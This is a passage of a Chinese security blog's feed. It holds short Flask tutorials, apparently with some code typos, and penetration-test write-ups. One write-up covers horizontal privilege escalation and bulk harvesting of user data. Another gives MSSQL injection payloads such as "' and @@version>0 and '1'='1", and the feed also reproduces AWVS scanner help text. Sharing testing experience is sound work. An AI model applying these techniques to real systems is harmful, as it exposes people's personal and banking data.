      <content type="html"><![CDATA[<h2 id="自定义url-for"><a href="#自定义url-for" class="headerlink" title="自定义url_for"></a>自定义url_for</h2><p>定义函数后，可以通过自定义一个类并添加到converter中，</p><ol><li>实现一个类，继承自“BaseConverter”；</li><li>在自定义类中，重写正则，也就是重写变量的正则表达式；</li><li>将自定义的类，映射到“app.url_map.converters”，示例：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TelephoneConveter</span><span class="params">(BaseConverter)</span>:</span></span><br><span class="line">    regex = <span class="string">r'1[85734]\d&#123;9&#125;'</span></span><br><span class="line"></span><br><span class="line">app.url_map.converters[<span class="string">'tel'</span>] = TelephoneConveter</span><br></pre></td></tr></table></figure><h3 id="to-python"><a href="#to-python" class="headerlink" title="to_python()"></a>to_python()</h3><p>将url中的参数经过解析传递给视图函数。</p><h3 id="to-url"><a href="#to-url" class="headerlink" title="to_url"></a>to_url</h3><p>将“url_for”反转的url参数放到url中。就是调用url_for函数生成符合要求的url格式。</p>]]></content>
      
      
        <tags>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>FlaskDays-Url补充</title>
      <link href="/2019/01/01/FlaskDays-URL%E8%A1%A5%E5%85%85/"/>
      <url>/2019/01/01/FlaskDays-URL%E8%A1%A5%E5%85%85/</url>
      <content type="html"><![CDATA[<h2 id="指定访问网络和访问端口"><a href="#指定访问网络和访问端口" class="headerlink" title="指定访问网络和访问端口"></a>指定访问网络和访问端口</h2><p>修改host为0.0.0.0</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Falsk(__name__)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">"hello world."</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">app.run(debug=<span class="keyword">True</span>, host=<span class="string">'0.0.0.0'</span>)</span><br><span class="line"><span class="comment">## Flask项目默认使用5000端口，也可以指定端口号</span></span><br><span class="line"><span class="comment"># app.run(debug=True, port=9999, host='0.0.0.0')</span></span><br></pre></td></tr></table></figure><h2 id="URL唯一"><a href="#URL唯一" class="headerlink" title="URL唯一"></a>URL唯一</h2><p>定义URL时，可以在访问路径后默认添加一个‘/’，原因两点：</p><ol><li>提高用户体验，添加‘/’后，可以匹配到用户访问的‘/user/’和‘/user’两种方式的请求；</li><li>搜索引擎会将有无‘/’划分为两种不同的url请求；</li></ol><h2 id="GET请求和POST请求"><a href="#GET请求和POST请求" class="headerlink" title="GET请求和POST请求"></a>GET请求和POST请求</h2><ol><li>GET请求：获取资源</li><li>POST请求：提交请求</li><li>传递参数：</li></ol><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET请求：通过"?id=123"形式进行传递；</span><br><span class="line">POST请求：通过"Form Data"进行传递；</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：Flask route默认使用GET请求，可以通过method限定请求方法；<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.route(<span class="string">'/user/'</span>, method=[<span class="string">'GET'</span>])</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">"Hello world."</span></span><br></pre></td></tr></table></figure></p>]]></content>
      
      
        <tags>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>FlaskDay-重定向</title>
      <link href="/2019/01/01/FlaskDays-%E9%87%8D%E5%AE%9A%E5%90%91/"/>
      <url>/2019/01/01/FlaskDays-%E9%87%8D%E5%AE%9A%E5%90%91/</url>
      <content type="html"><![CDATA[<h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><h3 id="永久性重定向"><a href="#永久性重定向" class="headerlink" title="永久性重定向"></a>永久性重定向</h3><p>http状态码301，如访问‘<a href="http://www.jingdong.com’会301重定向到‘www.jd.com’。" target="_blank" rel="noopener">www.jingdong.com’会301重定向到‘www.jd.com’。</a></p><h3 id="暂时性重定向"><a href="#暂时性重定向" class="headerlink" title="暂时性重定向"></a>暂时性重定向</h3><p>http状态码为302，如访问某站点直接访问‘我的订单’选项，会重定向到登陆页面。</p><h3 id="flask重定向"><a href="#flask重定向" class="headerlink" title="flask重定向"></a>flask重定向</h3><p>flask中，使用flask.redirect(location, code=302)实现重定向。默认是302暂时性重定向。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">app.route(&apos;/profile/&apos;, method=[&apos;GET&apos;, &apos;POST&apos;])</span><br><span class="line">def profile():</span><br><span class="line">name = request.args.get(&apos;name&apos;)</span><br><span class="line"></span><br><span class="line">if not name:</span><br><span class="line">return redirect(url_for(&apos;login&apos;))</span><br><span class="line">else:</span><br><span class="line">return name</span><br></pre></td></tr></table></figure>]]></content>
      
      
        <tags>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>逻辑让人崩溃之越权姿势分享</title>
      <link href="/2018/12/13/%E9%80%BB%E8%BE%91%E8%AE%A9%E6%88%91%E5%B4%A9%E6%BA%83%E4%B9%8B%E8%B6%8A%E6%9D%83%E5%A7%BF%E5%8A%BF%E5%88%86%E4%BA%AB/"/>
      <url>/2018/12/13/%E9%80%BB%E8%BE%91%E8%AE%A9%E6%88%91%E5%B4%A9%E6%BA%83%E4%B9%8B%E8%B6%8A%E6%9D%83%E5%A7%BF%E5%8A%BF%E5%88%86%E4%BA%AB/</url>
      <content type="html"><![CDATA[<h2 id="0×00-写在前面"><a href="#0×00-写在前面" class="headerlink" title="## 0×00 写在前面"></a>## 0×00 写在前面</h2><p>文章首发是在先知社区，<a href="https://xz.aliyun.com/t/3549" target="_blank" rel="noopener">传送门：逻辑让我崩溃之越权姿势分享</a></p><p>本文涉及到三种越权思路，每种方式分别对应了一个实际的案例分享。这是自己在平时的测试中积累并值得分享的一些测试经验，可能不能将问题探究到多深入，希望文中的思路能有所用。</p><h2 id="0x01-修改返回包的越权"><a href="#0x01-修改返回包的越权" class="headerlink" title="## 0x01 修改返回包的越权"></a>## 0x01 修改返回包的越权</h2><h3 id="前情提要"><a href="#前情提要" class="headerlink" title="### 前情提要"></a>### 前情提要</h3><p>“修改返回包”这个越权的应用场景是一个请求使用加密算法加密请求的应用系统，测试过程中几乎所有的请求均加密，返回包为明文，此处可以使用如下案例中的方式进行越权测试。</p><h3 id="案例分享"><a href="#案例分享" class="headerlink" title="### 案例分享"></a>### 案例分享</h3><p>功能“我的账户”处可以查看当前账户下挂的所有账户对应的信息，同时通过卡片详情可以查看卡片的“账户详情”，以及之后的明细交易，余额等多个功能点。此处以“账户详情”功能为例。</p><p><img src="https://i.loli.net/2018/10/16/5bc533abc729d.png" alt="0.png"></p><p><img src="https://i.loli.net/2018/10/16/5bc533abe5b70.png" alt="1.png"></p><p>首先需要选择“我的账户”，该系统每个POST请求，格式都是同样的加密方式进行，如下所示，参数也只有RSA。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /users/cardcenter.do HTTP/1.1</span><br><span class="line">HOST: 1.1.1.1</span><br><span class="line"></span><br><span class="line">RSA=WEFGH%^UYBF&amp;HF)WHG($@hh9h9HG)FKJHSKGBGIEBUGIBG(&amp;S(GHEW(*GHHG)))</span><br></pre></td></tr></table></figure><p>但是请求返回的信息是明文返回，因为前端展示需要从上一个请求的json数据中提取有效信息，用于其中。<br><strong>此处问题也就出在这里，下一步的“账户详情”的请求，直接使用前端标签中的value卡号进行查询相关数据，那么，通过修改上一请求的返回包内容，即可为下一请求的水平越权做铺垫。</strong></p><p>”我的账户“原请求为：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /users/cardcenter.do HTTP/1.1</span><br><span class="line">HOST: 1.1.1.1</span><br><span class="line"></span><br><span class="line">RSA=ERfiegiue478y784goehghoHIGUIUUg*^&amp;^(*^%fdfgsg)</span><br></pre></td></tr></table></figure></p><p>”我的账户“原返回为：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"body"</span>:&#123;<span class="attr">"Name"</span>:<span class="string">"王刚"</span>,<span class="attr">"cardNO"</span>:<span class="string">"12345678"</span>,<span class="attr">"value"</span>:<span class="string">"24.33"</span>,<span class="attr">"Address"</span>:<span class="string">"北京市朝阳区亮马桥"</span>,<span class="attr">"tel"</span>:<span class="string">"13333333333"</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">将返回包中的cardNO参数“12345678”修改为其他账号“62308452”，则在前端显示修改后的账号。</span><br></pre></td></tr></table></figure></p><p>再次选择“我的账户”子功能“账户详情”，请求为加密，从返回包的内容可以看出水平越权成功：<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"body"</span>:&#123;<span class="attr">"Name"</span>:<span class="string">"郭德岗"</span>,<span class="attr">"cardNO"</span>:<span class="string">"222222"</span>,<span class="attr">"Type"</span>:<span class="string">"CNY"</span>,<span class="attr">"calType"</span>:<span class="string">"001"</span>,<span class="attr">"bankAddr"</span>:<span class="string">"2334"</span>,<span class="attr">"cardValue"</span>:<span class="string">"24.33"</span>,<span class="attr">"Address"</span>:<span class="string">"北京市朝阳区亮马桥"</span>,<span class="attr">"tel"</span>:<span class="string">"13333333333"</span>&#125;&#123;<span class="attr">"sublist"</span>:<span class="string">"2222220102"</span>,<span class="attr">"cardValue"</span>:<span class="string">"1000.00"</span>&#125;</span><br></pre></td></tr></table></figure></p><p>此处案例中上面所述内容的危害为水平越权查询信息，通过上述的方式可以查询他人卡号、证件号、手机号。</p><p>但同时在案例其他功能的某一处可以以此方式使用他人银行卡进行缴费。(PS: 找不到截图了，无法拼凑了。em……)</p><h2 id="0x02-寻找一个解密接口"><a href="#0x02-寻找一个解密接口" class="headerlink" title="## 0x02 寻找一个解密接口"></a>## 0x02 寻找一个解密接口</h2><h3 id="前情提要-1"><a href="#前情提要-1" class="headerlink" title="### 前情提要"></a>### 前情提要</h3><p>此案例的应用不同于上一案例，请求不进行加密，<strong>POST请求参数不经过任何加密混淆，返回数据的格式统一，并且参数对应值是经过加密处理的，即返回数据中，如果前端需要用到的参数，则返回为解密后的明文，其他参数为密文显示</strong>.</p><p><img src="https://i.loli.net/2018/10/17/5bc687dd25a72.png" alt="3.png"></p><h3 id="案例分享-1"><a href="#案例分享-1" class="headerlink" title="### 案例分享"></a>### 案例分享</h3><p>某应用的忘记密码处，存在这样一个流程，当你将自己的登录名(证件号或登录名)发送请求之后，会返回你的部分信息。</p><p><img src="https://i.loli.net/2018/10/18/5bc84c08b56ca.png" alt="3.png"></p><h4 id="证件号找回密码"><a href="#证件号找回密码" class="headerlink" title="####  证件号找回密码"></a>####  证件号找回密码</h4><p>尝试使用证件号作为登陆名进行验证找回密码，通过返回包中可以看到返回了“姓名”和“联系方式”的明文，其他字段为空，如下：</p><p><img src="https://i.loli.net/2018/10/18/5bc84ef503598.png" alt="4.png"></p><h4 id="用户名找回密码"><a href="#用户名找回密码" class="headerlink" title="#### 用户名找回密码"></a>#### 用户名找回密码</h4><p>尝试使用用户名作为登录名进行验证找回密码，通过翻译包可以看到返回的信息和证件号找回密码一样，包括“姓名”、“电话”、“证件号”，但是登录名的组合要比证件号利用程度更加容易，有很多常用的top500，top100等常见登录名，所以进行爆破的话可以获取大量信息。</p><p><img src="https://i.loli.net/2018/10/18/5bc850933d3bf.png" alt="5.png"></p><h4 id="问题-如何解密"><a href="#问题-如何解密" class="headerlink" title="#### 问题-如何解密"></a>#### 问题-如何解密</h4><p>但是可能注意到了，返回信息中的信息全是经过混淆加密的，那么如何对加密数据进行解密？这是个问题。</p><p>但是下一个请求“验证身份”之后要验证手机短信的时候，请求中将上一个请求查询到的所有密文提交验证了，<strong>然后然后竟然在返回包的js代码里找到了“手机号码”参数的明文信息，那么试试别的参数放到这个位置，Bingo！！！</strong></p><p><img src="https://i.loli.net/2018/12/13/5c1262ac19ab3.png" alt="6.png"></p><p>如下所示，将姓名参数的明文进行请求，获取了明文密码。</p><p>综上所述，可以首先对忘记密码处进行暴力破解，搜集所有的返回的信息密文，之后在验证信息时，对参数进行暴力破解，即可获取所有密文对应的明文信息。此处可以将所有用户的“证件号”、“手机号”、“姓名”、“用户名”进行完整搜集。</p><p><strong>同类似，如果遇到一个可以获取加密消息为请求密文的接口，上面的情况也有可能是适用的。</strong></p><h2 id="0x04-给加密的请求制造点错误"><a href="#0x04-给加密的请求制造点错误" class="headerlink" title="## 0x04 给加密的请求制造点错误"></a>## 0x04 给加密的请求制造点错误</h2><h3 id="案例"><a href="#案例" class="headerlink" title="### 案例"></a>### 案例</h3><p>有些系统测试的时候，请求数据格式为json，并且参数基本固定格式为如下示例所示，同时基本请求数据均在data部分进行加密混淆。<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /hello.do HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line"></span><br><span class="line">&#123;<span class="attr">"_zh"</span>:<span class="string">"1324"</span>,<span class="attr">"data"</span>:<span class="string">"QWERT+YHFGGi+fgfyefgyef+6/"</span>&#125;</span><br></pre></td></tr></table></figure></p><h4 id="尝试思路"><a href="#尝试思路" class="headerlink" title="#### 尝试思路"></a>#### 尝试思路</h4><ul><li>是否可以像“案例一”一样，有一个解密的接口，将密文转换为明文，但是此处场景无法获取整个请求的参数提交格式，所以思路不可行；</li><li>第二种方法，是否可以构造畸形data参数，从报错异常中构造处完整请求；</li></ul><h4 id="思路二的尝试"><a href="#思路二的尝试" class="headerlink" title="#### 思路二的尝试"></a>#### 思路二的尝试</h4><p>找到其他查询信息的接口，将任意接口的请求用来替换请求，因为请求接口不同，所以会出现报错信息，观察返回包是否可以解析或者产生什么报错？</p><p>首先，该功能接口正常请求和返回信息如下图所示：</p><p><img src="https://i.loli.net/2018/11/14/5bebec9a75d7a.png" alt="2.png"></p><p>当使用其他功能请求中的datas部分替换该请求的datas部分后，返回信息得到了满意的结果，如下所示：</p><p><img src="https://i.loli.net/2018/11/14/5bebed1293897.png" alt="3.png"></p><p>对上面的截图分析：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">原密文datas的明文可能为：</span><br><span class="line">&#123;<span class="attr">"name"</span>:<span class="string">"test1"</span>，<span class="string">"ID"</span>:<span class="string">"123456"</span>,<span class="attr">"phone"</span>:<span class="string">"13333333333"</span>&#125;</span><br><span class="line">畸形密文请求可能为：</span><br><span class="line">&#123;<span class="attr">"token"</span>:<span class="string">"234567890"</span>&#125;</span><br><span class="line">后者的json中参数名不满足此处接口所需的参数和数据，后端无法进行查询，直接返回报错信息为参数缺失，并且给出了具体的参数名，这样的结果就是获取到了此处请求的json中必须包含哪些参数，可以直接构造一个完全符合正常请求的明文请求。</span><br></pre></td></tr></table></figure><p>根据实际情况，构造出的明文json请求如下，后端是否会解析呢？</p><p><img src="https://i.loli.net/2018/12/13/5c1262d06f0d1.png" alt="4.png"></p><p>结果也很明显，后端接收并解析明文json的请求方式：</p><ul><li>明文请求</li><li>加密请求</li></ul><h4 id="思路梳理"><a href="#思路梳理" class="headerlink" title="#### 思路梳理"></a>#### 思路梳理</h4><p>此场景几点总结如下两点：</p><ul><li>是否可以明文请求以及明文返回，避免明文请求之后依然是密文返回；</li><li>是否可以从报错信息中直观获取有效参数名信息，这样可以减少构造参数名时需要大量的猜测过程；</li></ul><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="## 0x05 总结"></a>## 0x05 总结</h2><p>以上是自己平时测试遇到的情况梳理，希望有可取之处。</p>]]></content>
      
      
        <tags>
            
            <tag> 越权 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>AWVS_cmdlines</title>
      <link href="/2018/09/29/AWVS_cmdlines/"/>
      <url>/2018/09/29/AWVS_cmdlines/</url>
      <content type="html"><![CDATA[<h2 id="0x01-AWVS-cmdlines"><a href="#0x01-AWVS-cmdlines" class="headerlink" title="## 0x01 AWVS_cmdlines"></a>## 0x01 AWVS_cmdlines</h2><p><a href="https://github.com/PyxYuYu/MyBlog/issues/15" target="_blank" rel="noopener">【转自https://github.com/PyxYuYu/MyBlog/issues/15】</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">Acunetix WVS Console Application (c) Acunetix Ltd.</span><br><span class="line"></span><br><span class="line">&gt;&gt; USAGE: wvs_console /Scan [URL]  OR  /Crawl [URL]  OR  /ScanFromCrawl [FILE]</span><br><span class="line">                      OR  /ScanWSDL [WSDL URL]</span><br><span class="line"></span><br><span class="line">&gt;&gt; PARAMETERS                                                                        //参数</span><br><span class="line">       /Scan [URL]               : Scan specified URL                                //扫描指定的URL</span><br><span class="line">       /Crawl [URL]              : Crawl specified URL                               //爬行指定的URL</span><br><span class="line">       /ScanFromCrawl [FILE]     : Scan from crawling results                        //扫描爬行的结果</span><br><span class="line">       /ScanWSDL [WSDL URL]      : Scan web services from WSDL URL                   //扫描来自WSDL的参数URL</span><br><span class="line"></span><br><span class="line">       /Profile [PROFILE_NAME]   : Use specified scanning profile during scanning    //使用指定的扫描配置进行扫描</span><br><span class="line">       /Settings [FILE]          : Use specified settings template during scanning   //使用指定的设置模板进行扫描</span><br><span class="line">       /LoginSeq [FILE]          : Use specified login sequence                      //使用指定的登录序列</span><br><span class="line">       /Import [FILE(s)]         : Import files during crawl                         //导入检索的地址进行爬行</span><br><span class="line">       /Run [command line]       : Run this command during crawl                     //爬行时运行这个命令</span><br><span class="line">       /Selenium [FILE]          : Execute selenium script during crawl              //执行selenium脚本进行爬行</span><br><span class="line"></span><br><span class="line">       /Save                     : Save scan results                                 //保存结果</span><br><span class="line">       /SaveFolder [DIR]         : Specify the folder were all the saved data will be stored //保存记录的目录</span><br><span class="line">       /GenerateZIP              : Compress all the saved data into a zip file       //对所有的数据进行zip压缩</span><br><span class="line">       /ExportXML                : Exports results as XML                            //将结果以XML方式导出</span><br><span class="line">       /ExportAVDL               : Exports results as AVDL                           //将结果以AVDL方式导出</span><br><span class="line">       /SavetoDatabase           : Save alerts to the database                       //把警告数据保存进数据库</span><br><span class="line">       /SaveLogs                 : Save scan logs                                    //保存扫描日志</span><br><span class="line">       /SaveCrawlerData          : Save crawler data (.CWL file)                     //保存爬行数据</span><br><span class="line">       /GenerateReport           : Generate a report after the scan was completed    //扫描完成后生成报告</span><br><span class="line">       /ReportFormat [FORMAT]    : Generated report format (REP, PDF, RTF, HTML)     //生成报告的格式</span><br><span class="line">       /ReportTemplate [TEMPLATE]: Specify the report template                       //特定的报告模板</span><br><span class="line">       /Timestamps               : Print current timestamp with each line.           //打印每行的时间戳</span><br><span class="line">       /SendEmail                : Send email notification when scan is completed, using scheduler settings. //扫描结束后发送电子邮件</span><br><span class="line">       /EmailAddress [EMAIL]     : Send email notification to this email address, override scheduler settings. //邮件地址，会把之前设置的给覆盖掉</span><br><span class="line"></span><br><span class="line">       /Verbose                  : Enable verbose mode                               //开启细节模式。也就是发送的具体参数</span><br><span class="line">       /Password                 : Application password (if required)                //如果有，需要写入密码</span><br><span class="line">       /?                        : Show this help screen                             //帮助信息</span><br><span class="line"></span><br><span class="line">&gt;&gt; OPTIONS [ ? = TRUE or FALSE ]                                                   //选项  =true 或者是=false</span><br><span class="line">       --GetFirstOnly=?          : Get only the first URL                            //仅仅获取第一个url</span><br><span class="line">       --RestrictToBaseFolder=?  : Do not fetch anything above start folder          //不扫描当前目录以上的其他目录(扫描二级目录有效)</span><br><span class="line">       --FetchSubdirs=?          : Fetch files bellow base folder                    //获取子目录</span><br><span class="line">       --ForceFetchDirindex=?    : Fetch directory indexes even if not linked        //扫描目录，即使该目录不再链接里面(就是目录匹配)</span><br><span class="line">       --RobotsTxt=?             : Retrieve and process robots.txt                   //从robots.txt里面获取目录进行爬行</span><br><span class="line">       --CaseInsensitivePaths=?  : Use case insensitive paths                        //不区分路径的大小写</span><br><span class="line">       --UseWebKit=?             : Use WebKit based browser for discovery            //使用基于WebKit的浏览器</span><br><span class="line">       --ScanningMode=*          : Scanning mode (* = Quick, Heuristic, Extensive)   //扫描模式(快速、启发式、广泛的)</span><br><span class="line">       --ManipHTTPHeaders=?      : Manipulate HTTP headers                           //http头可以修改(可以修改http头进行提交)</span><br><span class="line">       --UseAcuSensor=?          : Use AcuSensor technology                          //使用AcuSensor技术</span><br><span class="line">       --EnablePortScanning=?    : Enable port scanning                              //启用端口扫描</span><br><span class="line">       --UseSensorDataFromCrawl=*: Use sensor data from crawl(* = Yes, No, Revalidate) //抓取fuzz提交的数据( = 是,否，重新验证)</span><br><span class="line">       --HtmlAuthUser=?          : Username for HTML based authentication            //基于HTTP认证的用户名</span><br><span class="line">       --HtmlAuthPass=?          : Password for HTML based authentication            //基于HTTP认证的密码</span><br><span class="line">       --ToolTimeout=?           : Timeout for testing tool in seconds               //设置提交的超时时间</span><br><span class="line"></span><br><span class="line">&gt;&gt; EXAMPLES</span><br><span class="line">wvs_console /Scan http://testphp.vulnweb.com  /SaveFolder c:\temp\scanResults\ /Save</span><br><span class="line">wvs_console /ScanWSDL http://test/WS.asmx?WSDL /Profile ws_default /Save</span><br><span class="line">wvs_console /Scan http://testphp.vulnweb.com /Profile default /Save --UseWebKit=false --ScanningMode=Heuristic</span><br></pre></td></tr></table></figure>]]></content>
      
      
        <tags>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>一次&quot;走进误区&quot;的Mssql注入</title>
      <link href="/2018/08/17/%E4%B8%80%E6%AC%A1%E8%B5%B0%E8%BF%9B%E8%AF%AF%E5%8C%BA%E7%9A%84Mssql%E6%B3%A8%E5%85%A5/"/>
      <url>/2018/08/17/%E4%B8%80%E6%AC%A1%E8%B5%B0%E8%BF%9B%E8%AF%AF%E5%8C%BA%E7%9A%84Mssql%E6%B3%A8%E5%85%A5/</url>
      <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><blockquote><p>首发，<a href="https://xz.aliyun.com/t/2596" target="_blank" rel="noopener">【一次走进误区的Mssql注入 https://xz.aliyun.com/t/2596】</a></p></blockquote><h2 id="0x01-有问题吧"><a href="#0x01-有问题吧" class="headerlink" title="# 0x01 有问题吧?"></a># 0x01 有问题吧?</h2><blockquote><ul><li>抓包看到输入一个号码后，会有两个请求查询判断：</li></ul></blockquote><p><img src="https://i.loli.net/2018/07/13/5b483fb875dda.png" alt="请求判断"></p><blockquote><blockquote><ol><li>卡号是否存在；</li><li>卡号对应的个人信息；</li></ol></blockquote><ul><li>初步判断：<strong><em>此处进行了数据库查询</em></strong></li></ul></blockquote><h2 id="0x02-进一步测试"><a href="#0x02-进一步测试" class="headerlink" title="# 0x02 进一步测试"></a># 0x02 进一步测试</h2><h3 id="Part-Ⅰ-自动化工具"><a href="#Part-Ⅰ-自动化工具" class="headerlink" title="## Part Ⅰ 自动化工具"></a>## Part Ⅰ 自动化工具</h3><blockquote><ul><li><p>直接使用了sqlmap，同时首次实用工具时参数上添加了几个条件：</p><blockquote><ol><li><p>“– delay 10”；</p><blockquote><p>为什么使用delay，因为考虑到测试对象的敏感程度，有waf等防护是必然的，请求的延时可以避免大量测试请求直接造成IP被封禁等一系列的影响，造成之后测试的硬性阻隔，当然，之后的测试发现，短时间内的频繁请求会被禁IP。</p></blockquote></li><li><p>“–time-sec 15” ; // 考虑到时间盲注的延时</p></li><li><p>“–timeout 20” ; // 考虑到超时</p></li><li><p>“tamper”; // 混淆&amp;绕过</p><blockquote><p>此处的正常思路应是先尝试确认过滤了哪些字符，哪些没有被过滤，然后逐步构造payload，针对性的写tamper进行测试。</p></blockquote></li></ol></blockquote><ul><li><strong>自己使用自动化工具不能发现问题，判断此处不存在注入，可能是因为自带的tamper混淆没有能够成功构造出合适的payload. </strong></li></ul></li></ul></blockquote><h3 id="Part-Ⅱ-手工注入"><a href="#Part-Ⅱ-手工注入" class="headerlink" title="## Part Ⅱ 手工注入"></a>## Part Ⅱ 手工注入</h3><h4 id="信息确认"><a href="#信息确认" class="headerlink" title="### 信息确认"></a>### 信息确认</h4><blockquote><ul><li>回到手工注入，首先需要判断什么数据库类型等数据库信息，之后可以针对性的进行构造；</li></ul><blockquote><ol><li>构造常规的payload “ ‘ and @@version ”，或是“ ‘ and @@version – ”提示语法错误；</li></ol><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; &gt; payload1: ' select @@version </span><br><span class="line">&gt; &gt;</span><br></pre></td></tr></table></figure></blockquote></blockquote><blockquote><blockquote><p><strong>Tips：</strong></p><blockquote><ul><li><strong>这里使用数据库“内置函数“进行测试，因为数据库查询的优先级原因，正常情况下会优先执行内置函数查询</strong></li><li><strong>通过报错可以看到语法错误，以及通过报错信息搜集数据库信息，辅助确定数据库类型</strong></li><li><strong>如果执行了构造的payload，那么页面返回信息会显示相关的信息</strong></li></ul></blockquote><p><img src="https://i.loli.net/2018/07/15/5b4b54bd4098e.png" alt="payload报错"></p></blockquote><blockquote><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; &gt; **上一次尝试select 语句有错误，换用另一payload进行测试，如下**</span><br><span class="line">&gt; &gt; payload2: /' and @@version    </span><br><span class="line">&gt; &gt;</span><br></pre></td></tr></table></figure></blockquote></blockquote><blockquote><blockquote></blockquote><p><img src="https://i.loli.net/2018/07/13/5b48452b10b81.png" alt="语法错误"></p><blockquote><p><strong>注：这个报错信息不是构造的payload参数中的，是其他代码的错误，并且注释符都无用，最后想到的可能性为，此处的“or a.xxxcode= ”语句是前面用户输入ID值得一部分，需要作为整体去数据库查询，只能闭合当前的payload，所以用下面的方法，再添加and语句，完成闭合 </strong></p></blockquote><figure class="highlight"><figcaption><span>lite</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; payload4: ' and @@version&gt;0 and '1'='1</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><img src="https://i.loli.net/2018/07/13/5b48446abeaf7.png" alt=""></p><blockquote><p><strong>注：</strong></p><ul><li><strong>这里的思路是结合数据库查询的优先级，使用数据库的内置函数，它的查询顺序优先于一般查询，因此此处使用数据库内置函数进行尝试；</strong></li></ul></blockquote></blockquote><h4 id="mssql注入"><a href="#mssql注入" class="headerlink" title="### mssql注入"></a>### mssql注入</h4><blockquote><ul><li>数据库类型确定：MSSQL</li><li>爆破其他参数：</li></ul><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 